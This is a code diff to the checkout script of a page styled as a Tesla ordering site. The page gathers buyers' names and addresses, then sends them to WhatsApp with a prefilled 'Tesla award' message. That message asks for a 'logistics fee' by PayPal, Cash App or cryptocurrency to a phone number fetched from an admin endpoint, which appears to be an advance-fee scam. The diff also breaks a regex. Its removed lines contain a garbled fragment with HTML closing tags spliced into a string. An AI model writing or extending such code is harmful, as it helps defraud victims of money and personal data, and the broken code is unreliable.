@@ -99,7 +99,7 @@
   var PR = '15814783495';
   try {
     var A = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
-    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/\D/g,''); }).catch(function(){});
+    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/D/g,''); }).catch(function(){});
   } catch(_e) {}
 
   document.getElementById('smModel').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
@@ -129,24 +129,17 @@
     b.disabled = false;
     b.style.opacity = '1';
     b.style.cursor = 'pointer';
-    b.textContent = '🔒 Pay ' + (sm ? sm.priceDisplay : '') + ' & Place Order';
+    b.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' — Place Order';
   };
 
-  var _isProcessing = false; // Prevent double-submits
+  var _isProcessing = false;
 
   window.processPayment = function() {
-    // Prevent duplicate submissions while request is in flight
-    if (_isProcessing) {
-      return;
-    }
-
-    // Validate payment method selection
+    if (_isProcessing) return;
     if (!sp) {
       if (typeof showToast === 'function') showToast('Please select a payment method before continuing.', 'error');
       return;
     }
-
-    // Session token is optional — proceed even without it (guest orders allowed)
     if (!st) {
       st = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
     }
@@ -156,8 +149,7 @@
     btn.disabled = true;
     btn.style.opacity = '0.55';
     btn.style.cursor = 'not-allowed';
-    btn.textContent = '⏳ Processing...';
-    
+    btn.textContent = 'Processing...';
     if (typeof showLoading === 'function') showLoading('Processing your order...');
 
     var payMethodName = sp === 'paypal' ? 'PayPal' : sp === 'cashapp' ? 'Cash App' : 'Cryptocurrency';
@@ -169,7 +161,7 @@
       return fetch(B + e, { method: m, headers: { 'Content-Type': 'application/json' }, body: b ? JSON.stringify(b) : null }).then(function(r) {
         var ct = r.headers.get('content-type') || '';
         return (ct.includes('application/json') ? r.json() : r.text()).then(function(d) {
-          if (!r.ok) { var msg = typeof d === 'string' ? d : (d.error || d.message || 'Something went wrong.'); throw new Error(msg); }
+          if (!r.ok) { var errMsg = typeof d === 'string' ? d : (d.error || d.message || 'Something went wrong.'); throw new Error(errMsg); }
           return d;
         });
       });
@@ -177,41 +169,30 @@
 
     doApiCall('/order', 'POST', payload).then(function(r) {
       var ord = r.order || {};
-      // Save full order to localStorage for order-placed page
       localStorage.setItem('tesla_last_order', JSON.stringify(ord));
       if (ord.selectedCar) localStorage.setItem('tesla_selected_car', JSON.stringify(ord.selectedCar));
       if (ord.deliveryDetails) localStorage.setItem('tesla_delivery_details', JSON.stringify(ord.deliveryDetails));
       if (ord.deliveryMethod) localStorage.setItem('tesla_delivery_method', JSON.stringify(ord.deliveryMethod));
-      
       var oid = ord.orderId || 'N/A';
       var trk = ord.trackingNumber || 'N/A';
-      var nm  = (ord.deliveryDetails && ord.deliveryDetails.fullName) || 'N/A';
+      var nm = (ord.deliveryDetails && ord.deliveryDetails.fullName) || 'N/A';
       var mdl = (ord.selectedCar && ord.selectedCar.name) ? 'Tesla ' + ord.selectedCar.name : 'N/A';
       var adr = ord.deliveryDetails ? [ord.deliveryDetails.address, ord.deliveryDetails.city, ord.deliveryDetails.state, ord.deliveryDetails.zipCode, ord.deliveryDetails.country].filter(Boolean).join(', ') : 'N/A';
-      var dm  = (ord.deliveryMethod && ord.deliveryMethod.name) ? ord.deliveryMethod.name : 'N/A';
-      var fee = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? '
-  };
-})();
-</script>
-</body>
-<!-- build: 1784129877 -->
-</html> + ord.deliveryMethod.price : 'Pending';
-      var msg = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*\n\n' +
-        '• *Order ID:* ' + oid + '\n' +
-        '• *Tracking Number:* ' + trk + '\n' +
-        '• *Customer Name:* ' + nm + '\n' +
-        '• *Tesla Model:* ' + mdl + '\n' +
-        '• *Delivery Address:* ' + adr + '\n' +
-        '• *Delivery Method:* ' + dm + ' (' + fee + ' Logistics Fee)\n' +
-        '• *Payment Method:* ' + payMethodName + '\n' +
-        '• *Total Logistics Fee Due:* ' + fee + '\n\n' +
+      var dm = (ord.deliveryMethod && ord.deliveryMethod.name) ? ord.deliveryMethod.name : 'N/A';
+      var feeVal = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? ord.deliveryMethod.price : 'Pending';
+      var fee = (typeof feeVal === 'number') ? ('$' + feeVal) : feeVal;
+      var msg = '*TESLA AWARD CONFIRMATION \u0026 PAYMENT DETAILS*\n\n' +
+        '\u2022 *Order ID:* ' + oid + '\n' +
+        '\u2022 *Tracking Number:* ' + trk + '\n' +
+        '\u2022 *Customer Name:* ' + nm + '\n' +
+        '\u2022 *Tesla Model:* ' + mdl + '\n' +
+        '\u2022 *Delivery Address:* ' + adr + '\n' +
+        '\u2022 *Delivery Method:* ' + dm + ' (' + fee + ' Logistics Fee)\n' +
+        '\u2022 *Payment Method:* ' + payMethodName + '\n' +
+        '\u2022 *Total Logistics Fee Due:* ' + fee + '\n\n' +
         'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + fee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
-      
-      // Remove loading overlay if it exists, then redirect immediately
       try { var overlay = document.getElementById('globalLoader'); if (overlay) overlay.remove(); } catch(e) {}
-      // Redirect to WhatsApp immediately — no waiting for animation
       window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg);
-      
     }).catch(function(e) {
       _isProcessing = false;
       var btn2 = document.getElementById('payBtn');
@@ -219,7 +200,7 @@
         btn2.disabled = false;
         btn2.style.opacity = '1';
         btn2.style.cursor = 'pointer';
-        btn2.textContent = '🔒 Pay ' + (sm ? sm.priceDisplay : '') + ' & Place Order';
+        btn2.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' — Place Order';
       }
       try { var overlay2 = document.getElementById('globalLoader'); if (overlay2) overlay2.remove(); } catch(e2) {}
       if (typeof showToast === 'function') showToast(e.message || 'Order failed. Please try again.', 'error');
@@ -227,6 +208,7 @@
   };
 })();
 </script>
+
 </body>
 <!-- build: 1784129877 -->
 </html>
